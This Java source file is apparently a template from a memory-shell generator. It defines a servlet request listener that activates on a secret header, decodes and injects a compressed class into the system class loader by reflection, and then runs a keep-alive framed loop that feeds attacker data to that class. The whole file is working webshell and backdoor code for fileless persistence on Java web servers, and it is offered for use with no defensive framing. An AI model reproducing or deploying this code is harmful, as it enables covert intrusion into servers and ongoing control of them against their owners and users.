package org.leo.jmg.mem.shell.http;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.zip.GZIPInputStream;

/**
 * Listener 内存马模板 — HTTPCHUNK 持久连接帧协议版本。
 * <p>
 * 与 {@link LeoListenerTpl}（单次请求/响应）不同，此模板在 Header 命中后
 * 进入 while(true) 帧循环，通过同一 HTTP 连接处理多个操作。
 * <p>
 * Listener 入口没有 response 参数，{@link #getResponseFromRequest(Object)} 为占位实现，
 * 由生成器按 serverType 动态注入实际方法体（见 {@link org.leo.jmg.util.response.ResponseUtil}）。
 * 帧格式与 {@link LeoFilterChunkTpl} 一致：frameType(1) + transportId(8) + dataLen(4) + data。
 */
public class LeoListenerChunkTpl extends ClassLoader implements ServletRequestListener {

    private static String headerName;
    private static String headerValue;
    private static String coreClassName;
    private static String coreClass;
    private static int respCode;

    public LeoListenerChunkTpl() {
    }

    public LeoListenerChunkTpl(ClassLoader z) {
        super(z);
    }

    @Override
    @SuppressWarnings("all")
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();
        try {
            if (request.getHeader(headerName) != null
                    && request.getHeader(headerName).contains(headerValue)) {
                HttpServletResponse response = (HttpServletResponse) getResponseFromRequest(request);
                response.setStatus(respCode);
                response.setHeader("X-Accel-Buffering", "no");
                response.setHeader("Connection", "keep-alive");
                response.setContentType("application/octet-stream");
                response.setBufferSize(8192);

                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                byte[] buffer = new byte[1024];
                int bytesRead;
                try {
                    Class.forName(coreClassName, true, ClassLoader.getSystemClassLoader());
                } catch (ClassNotFoundException e) {
                    GZIPInputStream gzipInputStream = new GZIPInputStream(
                            new ByteArrayInputStream(base64Decode(coreClass)));
                    while ((bytesRead = gzipInputStream.read(buffer)) != -1) {
                        byteArrayOutputStream.write(buffer, 0, bytesRead);
                    }
                    Method defineClassMethod = ClassLoader.class.getDeclaredMethod(
                            "defineClass",
                            new Class[]{String.class, byte[].class, int.class, int.class});
                    defineClassMethod.setAccessible(true);
                    defineClassMethod.invoke(ClassLoader.getSystemClassLoader(),
                            new Object[]{null, byteArrayOutputStream.toByteArray(),
                                    Integer.valueOf(0), Integer.valueOf(byteArrayOutputStream.size())});
                }

                DataInputStream dataInputStream = new DataInputStream(request.getInputStream());
                DataOutputStream dataOutputStream = new DataOutputStream(response.getOutputStream());
                dataOutputStream.flush();

                while (true) {
                    int frameType = dataInputStream.readUnsignedByte();
                    long transportId = dataInputStream.readLong();
                    int dataLen = dataInputStream.readInt();
                    if (dataLen < 0 || dataLen > 16777216) break;
                    byte[] data = new byte[dataLen];
                    dataInputStream.readFully(data);
                    if (frameType == 4) break;
                    if (frameType == 3) continue;
                    int responseType;
                    byte[] respData;
                    if (frameType == 2 && dataLen == 0) {
                        responseType = 3;
                        respData = new byte[0];
                    } else if (frameType == 1) {
                        responseType = 1;
                        byteArrayOutputStream = new ByteArrayOutputStream();
                        byteArrayOutputStream.write(data);
                        try {
                            ((java.lang.reflect.InvocationHandler) Class.forName(coreClassName, true, ClassLoader.getSystemClassLoader())
                                    .newInstance()).invoke(null, null, new Object[]{byteArrayOutputStream});
                        } catch (Throwable e) {
                            throw new IllegalStateException("Core invocation failed", e);
                        }
                        respData = byteArrayOutputStream.toByteArray();
                    } else {
                        break;
                    }
                    if (respData.length > 16777216) break;
                    dataOutputStream.writeByte(responseType);
                    dataOutputStream.writeLong(transportId);
                    dataOutputStream.writeInt(respData.length);
                    dataOutputStream.write(respData);
                    dataOutputStream.flush();
                }
            }
        } catch (Exception ignored) {
        }
    }

    @SuppressWarnings("PMD.UnusedFormalParameter")
    private Object getResponseFromRequest(Object request) throws Exception {
        return null;
    }

    @SuppressWarnings("all")
    public Object unwrap(Object obj) {
        try {
            return getFieldValue(obj, "response");
        } catch (Throwable e) {
            return obj;
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }

    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
    }
}
